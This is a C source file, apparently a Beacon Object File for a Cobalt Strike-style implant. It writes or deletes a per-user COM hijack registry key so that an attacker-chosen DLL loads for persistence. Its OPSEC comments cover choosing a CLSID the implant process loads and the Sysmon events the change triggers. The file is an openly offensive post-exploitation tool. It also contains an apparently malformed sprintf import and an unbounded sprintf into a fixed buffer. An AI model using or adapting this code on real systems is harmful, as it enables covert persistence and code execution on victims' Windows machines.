/*
 * comhijack.c — set or remove a user-COM-hijack key:
 *   HKCU\Software\Classes\CLSID\{<clsid>}\InprocServer32
 * Only user-class keys are touched (HKCU shadows HKLM COM for InprocServer32);
 * system classes are never modified.
 *
 * args: str clsidGuid, str dllPath (mode 1) / "-" (mode 0), int mode (1=set, 0=del)
 *
 * OPSEC:
 *   - The CLSID is operator-supplied; use only a CLSID whose real HKLM
 *     InprocServer32 the beacon process actually resolves (verify with the
 *     target runtime before committing to a GUID — wrong GUID = no load).
 *   - ThreadingModel=Both is set alongside the server string.
 *   - Sysmon 12/13 on creation; removal = 12 delete. The set value (a path you
 *     control) is the artifact — remove it in the same session when possible.
 */
#define CINTERFACE 1
#include <windows.h>
#include <string.h>
#include "beacon.h"

DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegCreateKeyExA(HKEY, const char*, DWORD, LPDWORD, DWORD, REGSAM, const SECURITY_ATTRIBUTES*, HKEY*, PHKEY);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegSetValueExA(HKEY, const char*, DWORD, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegDeleteTreeA(HKEY, const char*);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegQueryValueExA(HKEY, const char*, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT int __cdecl MSVCRTsprintf(char*, const char*, ...);

void go(char* args, int alen)
{
    datap p;
    BeaconDataParse(&p, args, alen);
    char* clsidA = BeaconDataExtract(&p, NULL);
    char* dllA   = BeaconDataExtract(&p, NULL);
    int   mode   = BeaconDataInt(&p);
    if (!clsidA || !*clsidA || (mode == 1 && (!dllA || !*dllA))) {
        BeaconPrintf(CALLBACK_ERROR, "usage: comhijack <clsidGuid> <dllPath|-> <mode 1=set|0=del>\n");
        return;
    }

    char keyA[220];
    MSVCRTsprintf(keyA, "Software\\Classes\\CLSID\\%s\\InprocServer32", clsidA);
    HKEY h;
    LSTATUS st;

    if (mode == 1) {
        st = ADVAPI32$RegCreateKeyExA(HKEY_CURRENT_USER, keyA, 0, NULL, 0, KEY_SET_VALUE, NULL, &h, NULL);
        if (st != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "[-] RegCreateKeyExA %lu\n", (unsigned long)st);
            return;
        }
        st = ADVAPI32$RegSetValueExA(h, NULL, 0, REG_SZ, (const BYTE*)dllA, (DWORD)strlen(dllA) + 1);
        if (st == ERROR_SUCCESS)
            st = ADVAPI32$RegSetValueExA(h, "ThreadingModel", 0, REG_SZ, (const BYTE*)"Both", 5);
        ADVAPI32$RegCloseKey(h);
        if (st == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] COM hijack set: HKCU\\%s = %s\n", keyA, dllA);
            BeaconPrintf(CALLBACK_OUTPUT, "[i] remove with: comhijack %s - 0 (removes only this user key)\n", clsidA);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] RegSetValueExA %lu\n", (unsigned long)st);
        }
    } else {
        /* removes exactly Software\Classes\CLSID\{guid}\InprocServer32 subtree
         * (our key only; the {guid} parent stays — verify with persist-inventory) */
        st = ADVAPI32$RegDeleteTreeA(HKEY_CURRENT_USER, keyA);
        if (st == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] COM hijack key removed: HKCU\\%s\n", keyA);
        } else if (st == 2 || st == 0x80070002) {
            BeaconPrintf(CALLBACK_OUTPUT, "[i] key absent: %s\n", keyA);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] RegDeleteTreeA 0x%lx — parent may remain, check: persist-inventory\n", (unsigned long)st);
        }
    }
}